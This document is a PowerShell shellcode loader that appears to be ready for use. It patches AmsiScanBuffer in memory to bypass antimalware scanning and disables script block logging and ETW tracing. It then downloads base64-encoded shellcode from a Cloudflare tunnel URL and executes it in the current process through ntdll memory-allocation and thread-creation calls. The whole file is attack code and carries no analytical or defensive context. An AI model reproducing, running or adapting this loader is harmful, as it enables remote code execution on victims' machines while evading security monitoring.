$u='https://mandatory-zip-installing-illinois.trycloudflare.com/payloads/shellcode.txt?key=57c36cda7fe1823797273b065ea3b8f8'
[Net.ServicePointManager]::SecurityProtocol='Tls12'

# === AMSI Bypass - Memory Patch ===
$W=@"
using System;using System.Runtime.InteropServices;
public class W{
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m,string p);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
}
"@
Add-Type $W
$L=[W]::LoadLibrary("am"+"si.dll")
$A=[W]::GetProcAddress($L,"Amsi"+"Scan"+"Buffer")
$p=0
[W]::VirtualProtect($A,[UIntPtr]::new(0x20),0x40,[ref]$p)|Out-Null
$B=[Byte[]](0x41,0x5F,0x41,0x5E,0x5F,0xB8,0x57,0x00,0x07,0x80,0xC3)
$A=[Int64]$A+0x14
[Runtime.InteropServices.Marshal]::Copy($B,0,[IntPtr]$A,$B.Length)
[W]::VirtualProtect([IntPtr]$A,[UIntPtr]::new(0x20),$p,[ref]$p)|Out-Null

# === Disable Script Block Logging ===
try {
    $s=[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
    if($s['ScriptBlockLogging']){$s['ScriptBlockLogging']['EnableScriptBlockLogging']=0;$s['ScriptBlockLogging']['EnableScriptBlockInvocationLogging']=0}
} catch {}

# === Patch ETW ===
try {
    [Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null
    $a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    $b=$a.GetField('etwProvider','NonPublic,Static')
    $b.SetValue($null,0)
} catch {}

# Syscall numbers for Windows 10/11 (may vary by build)
$code = @'
using System;
using System.Runtime.InteropServices;

public class Syscall {
    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr BytesBuffer);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
'@
Add-Type $code

$hProcess = [Syscall]::GetCurrentProcess()

# Download shellcode
try {
    $sc = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u))
} catch {
    return
}

# NtAllocateVirtualMemory - allocate RW memory
$baseAddr = [IntPtr]::Zero
$regionSize = [IntPtr]::new($sc.Length + 4096)
$status = [Syscall]::NtAllocateVirtualMemory($hProcess, [ref]$baseAddr, [IntPtr]::Zero, [ref]$regionSize, 0x3000, 0x04)
if ($status -ne 0) {return}

# NtWriteVirtualMemory - write shellcode
$written = [uint32]0
$status = [Syscall]::NtWriteVirtualMemory($hProcess, $baseAddr, $sc, [uint32]$sc.Length, [ref]$written)
if ($status -ne 0) {return}

# NtProtectVirtualMemory - change to RX
$protectAddr = $baseAddr
$protectSize = [IntPtr]::new($sc.Length)
$oldProtect = [uint32]0
$status = [Syscall]::NtProtectVirtualMemory($hProcess, [ref]$protectAddr, [ref]$protectSize, 0x20, [ref]$oldProtect)
if ($status -ne 0) {return}

# NtCreateThreadEx - execute
$hThread = [IntPtr]::Zero
$status = [Syscall]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $baseAddr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)

